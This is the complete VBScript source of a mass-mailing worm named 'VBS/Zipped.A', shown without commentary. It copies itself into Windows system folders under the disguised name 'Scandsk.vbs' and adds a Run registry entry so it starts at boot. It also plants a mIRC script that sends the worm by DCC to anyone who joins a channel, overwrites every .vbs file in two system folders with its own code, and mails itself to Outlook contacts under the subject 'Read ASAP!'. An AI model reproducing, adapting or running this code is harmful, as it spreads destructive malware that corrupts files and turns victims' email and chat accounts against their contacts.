'VBS/Zipped.A

Sub Virus()
On Error Resume Next

Const ForReading = 1, ForWriting = 2, ForAppending = 8

set x = CreateObject("Scripting.FileSystemObject")
set y = x.GetFile(WScript.ScriptFullName)
y.Copy ("C:\Windows\Zipped.vbs")
y.Copy ("C:\Windows\System\Scandsk.vbs")

set q = CreateObject("WScript.Shell")
Q.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Scandsk", "C:\Windows\System\Scandsk.vbs"

set w = CreateObject("Scripting.FileSystemObject")
w.CreateTextFile("c:\mirc\script.ini")
set z = w.GetFile("c:\mirc\script.ini")
set v = z.OpenAsTextStream(2, False)
v.write "[script] " & vbCrLf
v.write "n0=on 1:join:#:if ($nick == $me) halt | else dcc send $nick C:\Windows\Zipped.vbs " & vbCrLf
v.close

set m = w.OpenTextFile(WScript.ScriptFullName, 1)
u = m.ReadAll
set k = w.GetFolder("C:\Windows")
set l = k.Files
For Each Target in l
SoftExt = lcase(w.GetExtensionName(target.Name))
if SoftExt = "vbs" Then
set o = w.OpenTextFile(target.path, 2, True)
o.write u
o.close 
end if
next

set m = w.OpenTextFile(WScript.ScriptFullName, 1)
u = m.ReadAll
set k = w.GetFolder("C:\Windows\System")
set l = k.Files
For Each Target in l
SoftExt = lcase(w.GetExtensionName(target.Name))
if SoftExt = "vbs" Then
set o = w.OpenTextFile(target.path, 2, True)
o.write u
o.close 
end if
next

Dim vbsOutlook, vbsMapi, vbsSend, Addr, AddrBook
Set vbsOutlook = CreateObject("Outlook.Application")
Set vbsMapi = vbsOutlook.GetNameSpace("MAPI")
 If vbsOutlook = "Outlook" Then
    vbsMapi.Logon "profile", "password"
    For y = 1 To vbsMapi.AddressLists.Count
        Set AddrBook = vbsMapi.AddressLists(y)
        x = 1
        Set vbsSend = vbsOutlook.CreateItem(0)
        For oo = 1 To AddrBook.AddressEntries.Count
            Addr = AddrBook.AddressEntries(x)
            vbsSend.Recipients.Add Addr
            x = x + 1
            If x > 50 Then oo = AddrBook.AddressEntries.Count
         Next 
         vbsSend.Subject = "Read ASAP!"
         vbsSend.Body = "Check out this Attached file below ASAP"
         vbsSend.Attachments.Add WScript.ScriptFullName
         vbsSend.Send
         Addr = ""
    Next 
    vbsMapi.Logoff
End If


End Sub
Virus()